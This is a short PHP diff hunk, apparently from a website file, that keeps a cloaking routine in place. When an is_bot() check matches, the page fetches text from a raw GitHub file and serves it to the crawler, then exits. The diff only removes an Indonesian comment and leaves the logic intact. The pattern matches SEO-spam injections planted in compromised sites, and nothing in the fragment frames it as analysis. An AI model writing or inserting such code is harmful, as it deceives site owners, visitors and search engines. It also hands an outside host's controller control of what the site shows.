@@ -12,8 +12,7 @@ function is_bot() {
     return false;
 }
 
-if (is_bot()) { 
-    // Jika pengunjung adalah bot
+if (is_bot()) {
     $message = file_get_contents('https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/uppen.txt');
     echo $message; 
     exit;
